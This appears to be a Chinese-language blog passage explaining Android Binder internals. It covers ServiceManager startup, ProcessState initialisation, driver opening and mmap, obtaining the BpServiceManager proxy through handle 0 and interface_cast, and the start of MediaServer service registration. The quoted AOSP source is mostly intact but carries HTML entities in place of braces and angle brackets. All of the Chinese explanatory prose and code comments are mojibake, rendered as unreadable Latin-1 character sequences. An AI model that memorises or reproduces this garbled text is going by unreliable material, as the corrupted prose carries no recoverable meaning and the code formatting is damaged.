ServiceManager è¿™ä¸€ä¸ªçº¿ç¨‹å­˜åœ¨ ps->setThreadPoolMaxThreadCount(0); // åœ¨é˜»å¡è°ƒç”¨æ—¶ä¸­æ­¢è¿›ç¨‹ //FATAL_IF_NOT_ONEWAY: ServiceManager å‘èµ·çš„ Binder è°ƒç”¨å¿…é¡»æ˜¯å•å‘ï¼Œå¦åˆ™æ‰“å°å †æ ˆæ—¥å¿—æç¤º ps->setCallRestriction(ProcessState::CallRestriction::FATAL_IF_NOT_ONEWAY); // å®ä¾‹åŒ– ServiceManager, åˆå§‹åŒ–å‚æ•°ä¸º Access å¯¹è±¡çš„æ™ºèƒ½æŒ‡é’ˆ sp&lt;ServiceManager> manager = sp&lt;ServiceManager>::make(std::make_unique&lt;Access>()); //self register servicemanager,\"manager\" å°†ä½œä¸º servicemanager çš„ç¬¬ä¸€ä¸ªæœåŠ¡è¢«æ³¨å†Œ if (!manager->addService(\"manager\", manager, false /*allowIsolated*/, IServiceManager::DUMP_FLAG_PRIORITY_DEFAULT).isOk()) &#123; LOG(ERROR) &lt;&lt; \"Could not self register servicemanager\"; &#125; // å°† \"manager\" æœåŠ¡ä½œä¸ºæœåŠ¡ç«¯ Bbinder å¯¹è±¡ IPCThreadState::self()->setTheContextObject(manager); // å‘ binder é©±åŠ¨å‘é€ ioctl BINDER_SET_CONTEXT_MGR_EXT ä¿¡å·ï¼Œå°† servicemanager // åœ¨ ProcessState::initWithDriver ä¸­æ‰“å¼€é©±åŠ¨è®¾å¤‡ /dev/driver æ‰€è¿”å›çš„æ–‡ä»¶æè¿°ç¬¦å¥æŸ„ // ä½œä¸ºæ•´ä¸ª binder IPC é€šä¿¡ä¸­çš„ä¸Šä¸‹æ–‡ç®¡ç†è€… ps->becomeContextManager(); // å‡†å¤‡ looper sp&lt;Looper> looper = Looper::prepare(false /*allowNonCallbacks*/); // ç›‘å¬ BC_ENTER_LOOPER ä¿¡å·ï¼Œæ”¶åˆ°è¯¥ä¿¡å·åå›è°ƒå¤„ç† binder è°ƒç”¨ BinderCallback::setupTo(looper); // ç›‘å¬å®¢æˆ·ç«¯å›è°ƒ ClientCallbackCallback::setupTo(looper, manager); // é˜»å¡ç­‰å¾…å’Œå¤„ç†äº‹ä»¶ while(true) &#123; looper->pollAll(-1); &#125; // should not be reached return EXIT_FAILURE;&#125;# ProcessState::init //platform\\frameworks\\native\\libs\\binder\\ProcessState.cppsp&lt;ProcessState> ProcessState::self()&#123; return init(kDefaultDriver, false /*requireDefault*/);&#125;sp&lt;ProcessState> ProcessState::initWithDriver(const char* driver)&#123; return init(driver, true /*requireDefault*/);&#125;sp&lt;ProcessState> ProcessState::init(const char *driver, bool requireDefault)&#123; [[clang::no_destroy]] static sp&lt;ProcessState> gProcess; [[clang::no_destroy]] static std::mutex gProcessMutex; if (driver == nullptr) &#123; std::lock_guard&lt;std::mutex> l(gProcessMutex); return gProcess; &#125; /* è¿™é‡Œä½¿ç”¨äº†å•ä¾‹æ¨¡å¼çš„è®¾è®¡æ€æƒ³ï¼Œé€šè¿‡ std::once_flag å’Œ std::call_once æ¥ä¿è¯åªæœ‰ä¸€ä¸ªçº¿ç¨‹å¯ä»¥è¿›å…¥åˆå§‹åŒ–ä»£ç å—ï¼Œ è¿™ä¿è¯äº†åœ¨ä¸€ä¸ªçº¿ç¨‹ä¸­åªèƒ½æœ‰ä¸€ä¸ª ProcessState å®ä¾‹ å®ƒçš„å·¥ä½œæ–¹å¼å¦‚ä¸‹ [-] ç¬¬ä¸€æ¬¡è°ƒç”¨ std::call_once æ—¶ï¼Œå®ƒä¼šæ£€æŸ¥ä¸ std::once_flag å…³è”çš„æ ‡è®°æ˜¯å¦å·²è¢«è®¾ç½®ã€‚ å¦‚æœæ ‡è®°å°šæœªè®¾ç½®ï¼Œå®ƒå°†æ‰§è¡Œä¼ é€’ç»™ std::call_once çš„å¯è°ƒç”¨å¯¹è±¡ï¼Œ å¹¶è®¾ç½®æ ‡è®°ï¼Œä»¥æ ‡è®°åˆå§‹åŒ–å·²å®Œæˆã€‚ [-] å¦‚æœå…¶ä»–çº¿ç¨‹å°è¯•å†æ¬¡è°ƒç”¨ std::call_once ä¸ç›¸åŒçš„ std::once_flagï¼Œ å®ƒä¼šå‘ç°æ ‡è®°å·²ç»è®¾ç½®ï¼Œå› æ­¤ä¸ä¼šå†æ¬¡æ‰§è¡Œå¯è°ƒç”¨å¯¹è±¡ã€‚ */ [[clang::no_destroy]] static std::once_flag gProcessOnce; std::call_once(gProcessOnce, [&amp;]()&#123; // åˆ¤æ–­ binder é©±åŠ¨æ˜¯å¦å­˜åœ¨ if (access(driver, R_OK) == -1) &#123; ALOGE(\"Binder driver %s is unavailable. Using /dev/binder instead.\", driver); driver = \"/dev/binder\"; &#125; std::lock_guard&lt;std::mutex> l(gProcessMutex); // å°† driver ä½œä¸ºå‚æ•°å®ä¾‹åŒ– ProcessState, å¹¶èµ‹å€¼ç»™ gProcess gProcess = sp&lt;ProcessState>::make(driver); &#125;); if (requireDefault) &#123; // Detect if we are trying to initialize with a different driver, and // consider that an error. ProcessState will only be initialized once above. LOG_ALWAYS_FATAL_IF(gProcess->getDriverName() != driver, \"ProcessState was already initialized with %s,\" \" can't initialize with %s.\", gProcess->getDriverName().c_str(), driver); &#125; return gProcess;&#125;# ProcessState æ„é€ å‡½æ•° åœ¨ä»£ç çš„ç¬¬ 26 è¡Œï¼Œé€šè¿‡ driver å‚æ•°å®ä¾‹åŒ–äº† ProcessState, å®ƒé€šè¿‡ open_driver() æ‰“å¼€äº† binder é©±åŠ¨è®¾å¤‡ï¼Œå¹¶ä½¿ç”¨ mmap æ¥è¿›è¡Œå†…å­˜æ˜ å°„ //platform\\frameworks\\native\\libs\\binder\\ProcessState.cppProcessState::ProcessState(const char *driver) : mDriverName(String8(driver)) , mDriverFD(open_driver(driver))// é€šè¿‡ç³»ç»Ÿè°ƒç”¨é™·å…¥å†…æ ¸ï¼Œæ‰“å¼€ /dev/binder è®¾å¤‡ , mVMStart(MAP_FAILED)// æ˜ å°„å†…å­˜çš„èµ·å§‹åœ°å€ , mThreadCountLock(PTHREAD_MUTEX_INITIALIZER) , mThreadCountDecrement(PTHREAD_COND_INITIALIZER) , mExecutingThreadsCount(0) , mWaitingForThreads(0) , mMaxThreads(DEFAULT_MAX_BINDER_THREADS) , mStarvationStartTimeMs(0) , mThreadPoolStarted(false) , mThreadPoolSeq(1) , mCallRestriction(CallRestriction::NONE)&#123; if (mDriverFD >= 0) &#123; // mmap the binder, providing a chunk of virtual address space to receive transactions. // è°ƒç”¨å†…å­˜æ˜ å°„å‡½æ•° mmap, æ­¤æ—¶ binder é©±åŠ¨ä¼šåœ¨å†…æ ¸ç©ºé—´æ‰§è¡Œ binder_mmap, æ¥å°†ä¸€å—ç‰©ç†å†…å­˜åŒæ—¶æ˜ å°„åˆ° // ç”¨æˆ·ç©ºé—´å’Œå†…æ ¸ç©ºé—´ï¼Œæ¥å¸®åŠ©è¿›è¡Œè·¨è¿›ç¨‹é€šä¿¡ // #define BINDER_VM_SIZE ((1 * 1024 * 1024) - sysconf(_SC_PAGE_SIZE) * 2) = 1016KB // PAGE_SIZE è¢«å®šä¹‰ä¸º 4096 mVMStart = mmap(nullptr, BINDER_VM_SIZE, PROT_READ, MAP_PRIVATE | MAP_NORESERVE, mDriverFD, 0); if (mVMStart == MAP_FAILED) &#123; // *sigh* ALOGE(\"Using %s failed: unable to mmap transaction memory.\\n\", mDriverName.c_str()); close(mDriverFD); mDriverFD = -1; mDriverName.clear(); &#125; &#125;#ifdef __ANDROID__ LOG_ALWAYS_FATAL_IF(mDriverFD &lt; 0, \"Binder driver '%s' could not be opened. Terminating.\", driver);#endif&#125;# open_driver //platform\\frameworks\\native\\libs\\binder\\ProcessState.cppstatic int open_driver(const char *driver)&#123; // ä»¥è¯»å†™æ–¹å¼æ‰“å¼€ï¼Œå¹¶ä¸ºè¯¥æ–‡ä»¶æè¿°ç¬¦æ·»åŠ  close-on-exec (æ‰§è¡Œæ—¶å¯å…³é—­) çš„æ ‡å¿—ï¼Œ // æ¥é˜²æ­¢è¯¥æ–‡ä»¶æè¿°ç¬¦è¢«æ„å¤–æ³„æ¼ç»™äº† fork åˆ›å»ºå‡ºæ¥çš„å­è¿›ç¨‹ int fd = open(driver, O_RDWR | O_CLOEXEC); if (fd >= 0) &#123; int vers = 0; status_t result = ioctl(fd, BINDER_VERSION, &amp;vers); if (result == -1) &#123; ALOGE(\"Binder ioctl to obtain version failed: %s\", strerror(errno)); close(fd); fd = -1; &#125; if (result != 0 || vers != BINDER_CURRENT_PROTOCOL_VERSION) &#123; ALOGE(\"Binder driver protocol(%d) does not match user space protocol(%d)! ioctl() return value: %d\", vers, BINDER_CURRENT_PROTOCOL_VERSION, result); close(fd); fd = -1; &#125; // è®¾ç½®è¿™ä¸ªæ‰“å¼€çš„ binder å¯¹è±¡çš„æœ€å¤§çº¿ç¨‹æ•°ä¸º 15 size_t maxThreads = DEFAULT_MAX_BINDER_THREADS; result = ioctl(fd, BINDER_SET_MAX_THREADS, &amp;maxThreads); if (result == -1) &#123; ALOGE(\"Binder ioctl to set max threads failed: %s\", strerror(errno)); &#125; uint32_t enable = DEFAULT_ENABLE_ONEWAY_SPAM_DETECTION; result = ioctl(fd, BINDER_ENABLE_ONEWAY_SPAM_DETECTION, &amp;enable); if (result == -1) &#123; ALOGD(\"Binder ioctl to enable oneway spam detection failed: %s\", strerror(errno)); &#125; &#125; else &#123; ALOGW(\"Opening '%s' failed: %s\\n\", driver, strerror(errno)); &#125; return fd;&#125;# æ€»ç»“ # Binder ä¸­å„ä¸ªç±»çš„å«ä¹‰ åœ¨è¿›è¡Œåç»­çš„å­¦ä¹ å‰ï¼Œæˆ‘ä»¬å…ˆæ¥äº†è§£ä¸€ä¸‹ Binder ä¸­å„ä¸ªç±»çš„å«ä¹‰ ç±»å è¯´æ˜ BpRefBase RefBase çš„å­ç±»ï¼Œæä¾› remote () æ–¹æ³•è·å–è¿œç¨‹ Binder IInterface Binder æœåŠ¡æ¥å£çš„åŸºç±»ï¼ŒBinder æœåŠ¡é€šå¸¸éœ€è¦åŒæ—¶æä¾›æœ¬åœ°æ¥å£å’Œè¿œç¨‹æ¥å£ BpInterface è¿œç¨‹æ¥å£çš„åŸºç±»ï¼Œè¿œç¨‹æ¥å£æ˜¯ä¾›å®¢æˆ·ç«¯è°ƒç”¨çš„æ¥å£é›† BnInterface æœ¬åœ°æ¥å£çš„åŸºç±»ï¼Œæœ¬åœ°æ¥å£æ˜¯éœ€è¦æœåŠ¡ä¸­çœŸæ­£å®ç°çš„æ¥å£é›† IBinder Binder å¯¹è±¡çš„åŸºç±»ï¼ŒBBinder å’Œ BpBinder éƒ½æ˜¯è¿™ä¸ªç±»çš„å­ç±» BpBinder è¿œç¨‹ Binderï¼Œè¿™ä¸ªç±»æä¾› transact æ–¹æ³•æ¥å‘é€è¯·æ±‚ï¼ŒBpXXX å®ç°ä¸­ä¼šç”¨åˆ° BBinder æœ¬åœ° Binderï¼ŒæœåŠ¡å®ç°æ–¹çš„åŸºç±»ï¼Œæä¾›äº† onTransact æ¥å£æ¥æ¥æ”¶è¯·æ±‚ ProcessState ä»£è¡¨äº†ä½¿ç”¨ Binder çš„è¿›ç¨‹ IPCThreadState ä»£è¡¨äº†ä½¿ç”¨ Binder çš„çº¿ç¨‹ï¼Œè¿™ä¸ªç±»ä¸­å°è£…äº†ä¸ Binder é©±åŠ¨é€šä¿¡çš„é€»è¾‘ Parcel åœ¨ Binder ä¸Šä¼ é€’çš„æ•°æ®çš„åŒ…è£…å™¨ Binder æœåŠ¡çš„å®ç°ç±»é€šå¸¸éƒ½ä¼šéµå®ˆä¸‹é¢çš„å‘½åè§„åˆ™ æœåŠ¡çš„æ¥å£ä½¿ç”¨ I å­—æ¯ä½œä¸ºå‰ç¼€ è¿œç¨‹æ¥å£ä½¿ç”¨ Bp ä½œä¸ºå‰ç¼€ æœ¬åœ°æ¥å£ä½¿ç”¨ Bn ä½œä¸ºå‰ç¼€ p å³ proxy çš„æ„æ€ï¼Œæ˜¯å®¢æˆ·ç«¯ç”¨æ¥ä¸ Server äº¤äº’çš„ç±» IBinder å®¶æ— BpBinder å’Œ BBinder éƒ½æ˜¯ Android ä¸­ä¸ Binder é€šä¿¡ç›¸å…³çš„ä»£è¡¨ï¼Œå®ƒä»¬éƒ½ä» IBinder ç±»ä¸­æ´¾ç”Ÿè€Œæ¥ BpBinder æ˜¯å®¢æˆ·ç«¯ç”¨æ¥ä¸ Server äº¤äº’çš„ä»£ç†ç±»ï¼Œp å³ proxy çš„æ„æ€ BBinder åˆ™æ˜¯ proxy ç›¸å¯¹çš„ä¸€ç«¯ï¼Œå®ƒæ˜¯ proxy äº¤äº’çš„ç›®çš„ç«¯ã€‚å¦‚æœè¯´ BpBinder ä»£è¡¨å®¢æˆ·ç«¯ï¼Œé‚£ä¹ˆ BBinder åˆ™ä»£è¡¨æœåŠ¡ç«¯ã€‚è¿™é‡Œçš„ BpBinder å’Œ BBinder æ˜¯ä¸€ä¸€å¯¹åº”çš„ï¼Œå³æŸä¸ª BpBinder åªèƒ½å’Œå¯¹åº”çš„ BBinder äº¤äº’ åœ¨æ³¨å†ŒæœåŠ¡å’Œè·å–æœåŠ¡çš„è¿‡ç¨‹ä¸­ï¼ŒServiceManager å‡ä¸ºæœåŠ¡ç«¯ BpBinder é€šè¿‡ handle æ¥æ ‡è¯†å®ƒæ‰€å¯¹åº”çš„ BBinder ç«¯ï¼Œä¸å…¶ç›¸å…³çš„å‡½æ•°ä¸º sp&lt;IBinder&gt; ProcessState::getStrongProxyForHandle(int32_t handle) ,handle å€¼ä¸º 0 è¡¨ç¤º ServiceManager æ‰€å¯¹åº”çš„ BBinder IServiceManager å®¶æ— IServiceManagerã€BpServiceManager å’Œ BnServiceManager éƒ½ä¸ä¸šåŠ¡é€»è¾‘ç›¸å…³ã€‚ BnServiceManager åŒæ—¶ä» BBinder æ´¾ç”Ÿï¼Œè¡¨ç¤ºå®ƒå¯ä»¥ç›´æ¥å‚ä¸ Binder é€šä¿¡ã€‚ BpServiceManager è™½ç„¶ä» BpInterface ä¸­æ´¾ç”Ÿï¼Œä½†æ˜¯è¿™æ¡åˆ†æ”¯ä¼¼ä¹ä¸ BpBinder æ²¡æœ‰å…³ç³»ã€‚ BnServiceManager æ˜¯ä¸€ä¸ªè™šç±»ï¼Œå®ƒçš„ä¸šåŠ¡å‡½æ•°æœ€ç»ˆéœ€è¦å­ç±»æ¥å®ç°ã€‚ # ServiceManager çš„è·å–è¿‡ç¨‹ å½“ä¸€ä¸ª Server æƒ³è¦æ³¨å†ŒæœåŠ¡ï¼Œé‚£å¿…é¡»è¦çŸ¥é“ &quot;ServiceManager åœ¨å“ªé‡Œæ‰å¯ä»¥&quot;, æ‰€ä»¥éœ€è¦æœ‰ä¸€ä¸ªæ–¹æ³•æ¥è®© Server æ‰¾åˆ° ServiceManager, è¿™æ˜¯é€šè¿‡å‡½æ•° defaultServiceManager å®ç°çš„ // è·å– BpServiceManager å¯¹è±¡sp&lt;IServiceManager> sm(defaultServiceManager());defaultServiceManager çš„ä¸»è¦ä½œç”¨æ˜¯è·å– BpServiceManager å¯¹è±¡ï¼Œå®ƒé€šè¿‡ getContextObject è·å–åˆ°äº† ServiceManager çš„ BBinder æ‰€å¯¹åº”çš„ BpBinder å¯¹è±¡ï¼Œéšååˆ©ç”¨ interface_cast å°† BpBinder å¯¹è±¡è½¬æ¢æˆäº† BpServiceManager å¯¹è±¡ //platform\\frameworks\\native\\libs\\binder\\IServiceManager.cppsp&lt;IServiceManager> defaultServiceManager()&#123; std::call_once(gSmOnce, []() &#123; sp&lt;AidlServiceManager> sm = nullptr; while (sm == nullptr) &#123; // è·å– ServiceManager çš„ BBinder æ‰€å¯¹åº”çš„ BpBinder å¯¹è±¡ï¼Œ // å¹¶å°†è¯¥å¯¹è±¡é€šè¿‡ interface_cast è½¬æ¢ä¸º AidlServiceManager sm = interface_cast&lt;AidlServiceManager>(ProcessState::self()->getContextObject(nullptr)); if (sm == nullptr) &#123; ALOGE(\"Waiting 1s on context object on %s.\", ProcessState::self()->getDriverName().c_str()); sleep(1); &#125; &#125; // å®ä¾‹åŒ– ServiceManagerShim gDefaultServiceManager = sp&lt;ServiceManagerShim>::make(sm); &#125;); return gDefaultServiceManager;&#125;AidlServiceManager AidlServiceManager å…¶å®æ˜¯ android::os::IServiceManager çš„åˆ«å using AidlServiceManager = android::os::IServiceManager;ServiceManagerShim ä¹‹å‰æ˜¯æ²¡æœ‰ ServiceManagerShim çš„ï¼Œè€Œæ˜¯ç›´æ¥æ“ä½œ BpServiceManagerï¼Œè¿™ä¸ªè¾…åŠ©ç±»å°è£…äº† AIDL è‡ªåŠ¨ç”Ÿæˆçš„ BpServiceManagerï¼Œæ‰€ä»¥ç°åœ¨çš„å®¢æˆ·ç«¯ä»£ç æµå°±å˜æˆå¦‚ä¸‹ä¸‰æ­¥ï¼š 1. ç”¨æˆ·ä»£ç  2. libbinderä»£ç  binder/IServiceManager.cpp#ServiceManagerShim3. AIDL ä»£ç  android/os/IServiceManager.cpp#BpServiceManager æ¥å£libbinder ä¸­çš„ ServiceManagerShim èµ·åˆ°äº†ä¸€ä¸ªä¸­è½¬çš„ä½œç”¨ï¼ŒæŠŠè¯·æ±‚è½¬ç»™ out ä¸‹ AIDL è‡ªåŠ¨ç”Ÿæˆçš„ BpServiceManager, åŸæ¥æ˜¯åœ¨ libbinder#IServiceManager.cpp ä¸­æ‰‹å†™å®ç°ï¼Œç°åœ¨æ˜¯ AIDL å¸®ä½ å®ç°ã€‚ //platform\\frameworks\\native\\libs\\binder\\IServiceManager.cpp// From the old libbinder IServiceManager interface to IServiceManager.class ServiceManagerShim : public IServiceManager&#123;public: explicit ServiceManagerShim (const sp&lt;AidlServiceManager>&amp; impl); sp&lt;IBinder> getService(const String16&amp; name) const override; sp&lt;IBinder> checkService(const String16&amp; name) const override; status_t addService(const String16&amp; name, const sp&lt;IBinder>&amp; service, bool allowIsolated, int dumpsysPriority) override; Vector&lt;String16> listServices(int dumpsysPriority) override; sp&lt;IBinder> waitForService(const String16&amp; name16) override; bool isDeclared(const String16&amp; name) override; Vector&lt;String16> getDeclaredInstances(const String16&amp; interface) override; std::optional&lt;String16> updatableViaApex(const String16&amp; name) override; // for legacy ABI const String16&amp; getInterfaceDescriptor() const override &#123; return mTheRealServiceManager->getInterfaceDescriptor(); &#125; IBinder* onAsBinder() override &#123; return IInterface::asBinder(mTheRealServiceManager).get(); &#125;private: sp&lt;AidlServiceManager> mTheRealServiceManager;&#125;;# getContextObject è¿™ä¸ªå‡½æ•°æœ€ä¸»è¦çš„åŠŸèƒ½å°±æ˜¯è·å– ServiceManager çš„ BBinder æ‰€å¯¹åº”çš„ BpBinder å¯¹è±¡ï¼Œå®ƒé€šè¿‡è°ƒç”¨ getStrongProxyForHandle(0) æ¥è¿›è¡Œè·å– è¿™é‡Œä¼ å…¥çš„ handle çš„å€¼ä¸º 0, å®ƒè¡¨ç¤º ServiceManager æ‰€å¯¹åº”çš„ BBinder //platform\\frameworks\\native\\libs\\binder\\ProcessState.cppsp&lt;IBinder> ProcessState::getContextObject(const sp&lt;IBinder>&amp; /*caller*/)&#123; // åˆ›å»ºä¸€ä¸ª BpBinder å¯¹è±¡ï¼ŒgetStrongProxyForHandle ä¼ å…¥çš„å‚æ•° handle çš„å€¼ä¸º 0 //,0 ä»£è¡¨çš„å°±æ˜¯ ServiceManager æ‰€å¯¹åº”çš„ BBinderã€‚ sp&lt;IBinder> context = getStrongProxyForHandle(0); if (context) &#123; // The root object is special since we get it directly from the driver, it is never // written by Parcell::writeStrongBinder. internal::Stability::markCompilationUnit(context.get()); &#125; else &#123; ALOGW(\"Not able to get context object on %s.\", mDriverName.c_str()); &#125; return context;&#125;getStrongProxyForHandle(0) //platform\\frameworks\\native\\libs\\binder\\ProcessState.cppsp&lt;IBinder> ProcessState::getStrongProxyForHandle(int32_t handle)&#123; sp&lt;IBinder> result; AutoMutex _l(mLock); // æ ¹æ®ç´¢å¼•æŸ¥æ‰¾å¯¹åº”èµ„æºã€‚ handle_entry* e = lookupHandleLocked(handle); // å¦‚æœ lookupHandleLocked å‘ç°æ²¡æœ‰å¯¹åº”çš„èµ„æºé¡¹ï¼Œåˆ™ä¼šåˆ›å»ºä¸€ä¸ªæ–°çš„é¡¹å¹¶è¿”å›ã€‚ if (e != nullptr) &#123; // We need to create a new BpBinder if there isn't currently one, OR we // are unable to acquire a weak reference on this current one. The // attemptIncWeak() is safe because we know the BpBinder destructor will always // call expungeHandle(), which acquires the same lock we are holding now. // We need to do this because there is a race condition between someone // releasing a reference on this BpBinder, and a new reference on its handle // arriving from the driver. IBinder* b = e->binder; if (b == nullptr || !e->refs->attemptIncWeak(this)) &#123; if (handle == 0) &#123; // Special case for context manager... // The context manager is the only object for which we create // a BpBinder proxy without already holding a reference. // Perform a dummy transaction to ensure the context manager // is registered before we create the first local reference // to it (which will occur when creating the BpBinder). // If a local reference is created for the BpBinder when the // context manager is not present, the driver will fail to // provide a reference to the context manager, but the // driver API does not return status. // // Note that this is not race-free if the context manager // dies while this code runs. // // TODO: add a driver API to wait for context manager, or // stop special casing handle 0 for context manager and add // a driver API to get a handle to the context manager with // proper reference counting. IPCThreadState* ipc = IPCThreadState::self(); CallRestriction originalCallRestriction = ipc->getCallRestriction(); ipc->setCallRestriction(CallRestriction::NONE); Parcel data; status_t status = ipc->transact( 0, IBinder::PING_TRANSACTION, data, nullptr, 0); ipc->setCallRestriction(originalCallRestriction); if (status == DEAD_OBJECT) return nullptr; &#125; // åˆ›å»ºä¸€ä¸ª BpBinder sp&lt;BpBinder> b = BpBinder::create(handle); e->binder = b.get(); if (b) e->refs = b->getWeakRefs(); result = b; &#125; else &#123; // This little bit of nastyness is to allow us to add a primary // reference to the remote proxy when this team doesn't have one // but another team is sending the handle to us. result.force_set(b); e->refs->decWeak(this); &#125; &#125; return result;&#125;# interface_cast //platform\\frameworks\\native\\libs\\binder\\include\\binder\\IInterface.h/** * If this is a local object and the descriptor matches, this will return the * actual local object which is implementing the interface. Otherwise, this will * return a proxy to the interface without checking the interface descriptor. * This means that subsequent calls may fail with BAD_TYPE. */template&lt;typename INTERFACE>inline sp&lt;INTERFACE> interface_cast(const sp&lt;IBinder>&amp; obj)&#123; return INTERFACE::asInterface(obj);&#125;è¿™æ˜¯ä¸€ä¸ªæ¨¡æ¿å‡½æ•°ï¼Œå…¶ä¸­çš„ asInterface æ˜¯åœ¨ DECLARE_META_INTERFACE å®ä¸­å®šä¹‰çš„ asInterface //platform\\frameworks\\native\\include\\binder\\IInterface.h//## çš„ä½œç”¨æ˜¯å°†å‰åä¸¤ä¸ªæ ‡è¯†ç¬¦æˆ–ç¬¦å·è¿æ¥åœ¨ä¸€èµ·ï¼Œä»¥å½¢æˆä¸€ä¸ªå•ç‹¬çš„æ ‡è¯†ç¬¦æˆ–ç¬¦å·ã€‚// å¦‚ #define CONCATENATE (x, y) x##y// å¦‚æœè°ƒç”¨ CONCATENATE (a, b)ï¼Œå®ƒå°†è¢«å±•å¼€ä¸º ab#define DECLARE_META_INTERFACE(INTERFACE) \\public: \\ static const ::android::String16 descriptor; \\ static ::android::sp&lt;I##INTERFACE> asInterface( \\ const ::android::sp&lt;::android::IBinder>&amp; obj); \\ virtual const ::android::String16&amp; getInterfaceDescriptor() const; \\ I##INTERFACE(); \\ virtual ~I##INTERFACE(); \\ static bool setDefaultImpl(std::unique_ptr&lt;I##INTERFACE> impl); \\ static const std::unique_ptr&lt;I##INTERFACE>&amp; getDefaultImpl(); \\private: \\ static std::unique_ptr&lt;I##INTERFACE> default_impl; \\public: \\#define IMPLEMENT_META_INTERFACE(INTERFACE, NAME) \\ DO_NOT_DIRECTLY_USE_ME_IMPLEMENT_META_INTERFACE(INTERFACE, NAME) \\ #define DO_NOT_DIRECTLY_USE_ME_IMPLEMENT_META_INTERFACE(INTERFACE, NAME)\\ const ::android::StaticString16 \\ I##INTERFACE##_descriptor_static_str16(__IINTF_CONCAT(u, NAME));\\ const ::android::String16 I##INTERFACE::descriptor( \\ I##INTERFACE##_descriptor_static_str16); \\ const ::android::String16&amp; \\ I##INTERFACE::getInterfaceDescriptor() const &#123; \\ return I##INTERFACE::descriptor; \\ &#125; \\ ::android::sp&lt;I##INTERFACE> I##INTERFACE::asInterface( \\ const ::android::sp&lt;::android::IBinder>&amp; obj) \\ &#123; \\ ::android::sp&lt;I##INTERFACE> intr; \\ if (obj != nullptr) &#123; \\ intr = ::android::sp&lt;I##INTERFACE>::cast( \\ obj->queryLocalInterface(I##INTERFACE::descriptor)); \\ if (intr == nullptr) &#123; \\ intr = ::android::sp&lt;Bp##INTERFACE>::make(obj); \\ &#125; \\ &#125; \\ return intr; \\ &#125; \\ std::unique_ptr&lt;I##INTERFACE> I##INTERFACE::default_impl; \\ bool I##INTERFACE::setDefaultImpl(std::unique_ptr&lt;I##INTERFACE> impl)\\ &#123; \\ /* Only one user of this interface can use this function */ \\ /* at a time. This is a heuristic to detect if two different */ \\ /* users in the same process use this function. */ \\ assert(!I##INTERFACE::default_impl); \\ if (impl) &#123; \\ I##INTERFACE::default_impl = std::move(impl); \\ return true; \\ &#125; \\ return false; \\ &#125; \\ const std::unique_ptr&lt;I##INTERFACE>&amp; I##INTERFACE::getDefaultImpl() \\ &#123; \\ return I##INTERFACE::default_impl; \\ &#125; \\ I##INTERFACE::I##INTERFACE() &#123; &#125; \\ I##INTERFACE::~I##INTERFACE() &#123; &#125; \\æˆ‘ä»¬å°† interface_cast&lt;AidlServiceManager&gt;(new BpBinder(0)) é€šè¿‡å®å®šä¹‰æ›¿æ¢ä¸€ä¸‹çœ‹çš„ä¼šæ›´åŠ æ¸…æ¥šï¼Œåœ¨è¿™é‡Œ asInterface å°† BpBinder è½¬æ¢æˆäº† BpServiceManager , BpServiceManager ç»§æ‰¿äº† IServiceManager public:static const ::android::String16 descriptor;static ::android::sp&lt;IServiceManager> asInterface( const ::android::sp&lt;::android::IBinder>&amp; obj);virtual const ::android::String16&amp; getInterfaceDescriptor() const;IServiceManager();virtual ~IServiceManager();static bool setDefaultImpl(std::unique_ptr&lt;IServiceManager> impl);static const std::unique_ptr&lt;IServiceManager>&amp; getDefaultImpl();private:static std::unique_ptr&lt;IServiceManager> default_impl;public:const ::android::StaticString16 IServiceManager_descriptor_static_str16(__IINTF_CONCAT(u, android.os.IServiceManager));const ::android::String16 IServiceManager::descriptor( IServiceManager_descriptor_static_str16);const ::android::String16&amp; IServiceManager::getInterfaceDescriptor() const &#123; return IServiceManager::descriptor;&#125;// åœ¨è¿™é‡Œç»ˆäºå‡ºç°äº† asInterface å‡½æ•°çš„å®šä¹‰ï¼Œæˆ‘ä»¬ä¹Ÿæ‰¾åˆ°äº† BpServiceManager è¿™ä¸ªç±»::android::sp&lt;IServiceManager> IServiceManager::asInterface( const ::android::sp&lt;::android::IBinder>&amp; obj)&#123; ::android::sp&lt;IServiceManager> intr; if (obj != nullptr) &#123; intr = ::android::sp&lt;IServiceManager>::cast( obj->queryLocalInterface(IServiceManager::descriptor)); if (intr == nullptr) &#123; intr = ::android::sp&lt;BpServiceManager>::make(obj); &#125; &#125; return intr;&#125;std::unique_ptr&lt;IServiceManager> IServiceManager::default_impl;bool IServiceManager::setDefaultImpl(std::unique_ptr&lt;IServiceManager> impl)&#123; /* Only one user of this interface can use this function */ /* at a time. This is a heuristic to detect if two different */ /* users in the same process use this function. */ assert(!IServiceManager::default_impl); if (impl) &#123; IServiceManager::default_impl = std::move(impl); return true; &#125; return false;&#125;const std::unique_ptr&lt;IServiceManager>&amp; IServiceManager::getDefaultImpl()&#123; return IServiceManager::default_impl;&#125;IServiceManager::IServiceManager() &#123; &#125;IServiceManager::~IServiceManager() &#123; &#125;# æ€»ç»“ # Server å‘ ServiceManager æ³¨å†ŒæœåŠ¡ è¿™é‡Œä»¥ MediaServer ä¸ºä¾‹æ¥åˆ†æ Server å‘ ServiceManager æ³¨å†ŒæœåŠ¡çš„è¿‡ç¨‹ //platform\\frameworks\\av\\media\\mediaserver\\main_mediaserver.cppint main(int argc __unused, char **argv __unused)&#123; signal(SIGPIPE, SIG_IGN); // åˆ›å»ºä¸€ä¸ª ProcessState å®ä¾‹ï¼Œæ‰“å¼€é»˜è®¤é©±åŠ¨ /dev/binder å¹¶è¿›è¡Œ mmap å†…å­˜æ˜ å°„ // æ­¤æ–¹æ³•çš„è¯¦ç»†åˆ†æè¯·å‚è§å³ä¾§ç›®å½• ServiceManager çš„å¯åŠ¨è¿‡ç¨‹ ->ProcessState::init sp&lt;ProcessState> proc(ProcessState::self()); // å®¢æˆ·ç«¯è·å– ServiceManagerShim å¯¹è±¡ // æ­¤æ–¹æ³•çš„è¯¦ç»†åˆ†æè¯·å‚è§å³ä¾§ç›®å½• ServiceManager çš„è·å–è¿‡ç¨‹ sp&lt;IServiceManager> sm(defaultServiceManager()); ALOGI(\"ServiceManager: %p\", sm.get()); // æ³¨å†Œ media.player æœåŠ¡ MediaPlayerService::instantiate(); ResourceManagerService::instantiate(); registerExtensions(); ::android::hardware::configureRpcThreadpool(16, false); // å¯åŠ¨çº¿ç¨‹æ±  ProcessState::self()->startThreadPool(); // å°†çº¿ç¨‹åŠ å…¥çº¿ç¨‹æ±  IPCThreadState::self()->joinThreadPool(); ::android::hardware::joinRpcThreadpool();&#125;MediaPlayerService::instantiate è¿™ä¸ªå‡½æ•°çš„ä½œç”¨å°±æ˜¯è°ƒç”¨ defaultServiceManager çš„ addService æ–¹æ³•æ¥æ·»åŠ å‘ 